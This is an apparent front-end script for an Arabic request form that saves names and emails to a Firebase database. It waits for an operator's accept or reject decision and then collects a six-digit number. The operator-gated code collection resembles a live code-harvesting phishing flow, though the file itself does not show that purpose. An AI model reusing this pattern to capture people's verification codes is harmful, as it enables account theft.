import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
import { getDatabase, ref, set, push, update, onValue } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js';

const firebaseConfig = {
    apiKey: "AIzaSyBwkfW26EAPTiupO6mRejVcKMbpJZV1ohE",
    authDomain: "shahame-98a21.firebaseapp.com",
    databaseURL: "https://shahame-98a21-default-rtdb.firebaseio.com",
    projectId: "shahame-98a21",
    storageBucket: "shahame-98a21.firebasestorage.app",
    messagingSenderId: "885951504437",
    appId: "1:885951504437:web:55b4d335c9418ba376517c"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

const requestForm = document.getElementById('requestForm');
const orderForm = document.getElementById('orderForm');
const waitingPanel = document.getElementById('waitingPanel');
const messageDiv = document.getElementById('message');
const submitButton = document.getElementById('submitButton');
const orderSubmitButton = document.getElementById('orderSubmitButton');
const backButton = document.getElementById('backButton');
const qrButton = document.getElementById('qrButton');
const orderNumberInput = document.getElementById('orderNumber');
const pageTitle = document.getElementById('pageTitle');

let currentEmail = '';
let currentName = '';
let currentRequestRef = null;
let statusUnsubscribe = null;

requestForm.addEventListener('submit', async (event) => {
    event.preventDefault();

    currentEmail = document.getElementById('email').value.trim();
    currentName = document.getElementById('name').value.trim();

    if (!currentEmail || !currentName) {
        showMessage('يرجى إدخال البريد الإلكتروني والاسم', 'error');
        return;
    }

    submitButton.disabled = true;
    submitButton.textContent = 'جاري الحفظ...';
    showStep('waiting');

    try {
        if (!currentRequestRef) {
            currentRequestRef = push(ref(database, 'requests'));
            await set(currentRequestRef, {
                email: currentEmail,
                name: currentName,
                orderNumber: '',
                status: 'pending',
                timestamp: Date.now(),
                date: new Date().toLocaleString('ar-EG')
            });
        } else {
            await update(currentRequestRef, {
                email: currentEmail,
                name: currentName,
                updatedAt: Date.now()
            });
        }

        watchApprovalStatus();
    } catch (error) {
        showStep('details');
        showMessage('حدث خطأ أثناء حفظ البيانات. حاول مرة أخرى', 'error');
        console.error('Error:', error);
    } finally {
        submitButton.disabled = false;
        submitButton.textContent = 'تقديم طلب';
    }
});

orderForm.addEventListener('submit', async (event) => {
    event.preventDefault();

    const orderNumber = orderNumberInput.value.trim();

    if (!/^\d{6}$/.test(orderNumber)) {
        showMessage('يجب أن يكون رقم الطلب مكونا من 6 أرقام فقط', 'error');
        return;
    }

    orderSubmitButton.disabled = true;
    orderSubmitButton.textContent = 'جاري الإرسال...';

    try {
        if (!currentRequestRef) {
            currentRequestRef = push(ref(database, 'requests'));
            await set(currentRequestRef, {
                email: currentEmail,
                name: currentName,
                orderNumber,
                status: 'pending',
                timestamp: Date.now(),
                date: new Date().toLocaleString('ar-EG'),
                orderNumberUpdatedAt: Date.now()
            });
        } else {
            await update(currentRequestRef, {
                orderNumber,
                orderNumberUpdatedAt: Date.now()
            });
        }

        requestForm.reset();
        orderForm.reset();
        stopWatchingApprovalStatus();
        currentRequestRef = null;
        showStep('details');
        showMessage(`تم إرسال الطلب بنجاح. رقم الطلب: ${orderNumber}`, 'success');
    } catch (error) {
        showMessage('حدث خطأ أثناء إرسال الطلب. حاول مرة أخرى', 'error');
        console.error('Error:', error);
    } finally {
        orderSubmitButton.disabled = false;
        orderSubmitButton.textContent = 'إرسال الطلب';
    }
});

qrButton.addEventListener('click', () => {
    showMessage('زر المسح غير مفعل حاليا. يمكنك تقديم الطلب من النموذج.', 'error');
});

orderNumberInput.addEventListener('input', (event) => {
    event.target.value = event.target.value.replace(/\D/g, '');
});

backButton.addEventListener('click', () => {
    showStep('details');
});

function showMessage(text, type) {
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.classList.remove('hidden');
}

function watchApprovalStatus() {
    stopWatchingApprovalStatus();

    if (!currentRequestRef) {
        return;
    }

    statusUnsubscribe = onValue(currentRequestRef, (snapshot) => {
        const request = snapshot.val();
        const status = request?.status;

        if (status === 'accepted') {
            stopWatchingApprovalStatus();
            showStep('order');
            return;
        }

        if (status === 'rejected') {
            stopWatchingApprovalStatus();
            currentRequestRef = null;
            showStep('details');
            showMessage('\u0645\u0639\u0644\u0648\u0645\u0627\u062a \u063a\u064a\u0631 \u0635\u062d\u064a\u062d\u0629 \u064a\u0631\u062c\u0649 \u0627\u0644\u062a\u0627\u0643\u062f \u0645\u0646 \u0635\u062d\u0629 \u0627\u0644\u0645\u0639\u0644\u0648\u0645\u0627\u062a \u0648\u0627\u0644\u0645\u062d\u0627\u0648\u0644\u0629 \u0645\u0631\u0629 \u0627\u062e\u0631\u0649', 'error');
        }
    }, (error) => {
        stopWatchingApprovalStatus();
        showStep('details');
        showMessage('\u062d\u062f\u062b \u062e\u0637\u0623 \u0623\u062b\u0646\u0627\u0621 \u0645\u062a\u0627\u0628\u0639\u0629 \u062d\u0627\u0644\u0629 \u0627\u0644\u0637\u0644\u0628. \u062d\u0627\u0648\u0644 \u0645\u0631\u0629 \u0623\u062e\u0631\u0649', 'error');
        console.error('Status watch error:', error);
    });
}

function stopWatchingApprovalStatus() {
    if (statusUnsubscribe) {
        statusUnsubscribe();
        statusUnsubscribe = null;
    }
}

function showStep(step) {
    const isOrderStep = step === 'order';
    const isWaitingStep = step === 'waiting';

    requestForm.classList.toggle('hidden', isOrderStep || isWaitingStep);
    orderForm.classList.toggle('hidden', !isOrderStep);
    waitingPanel.classList.toggle('hidden', !isWaitingStep);
    pageTitle.textContent = isOrderStep ? 'رقم الطلب' : isWaitingStep ? 'يرجى الانتظار' : 'تقديم طلب';
    messageDiv.classList.add('hidden');

    if (isOrderStep) {
        orderNumberInput.focus();
    }
}
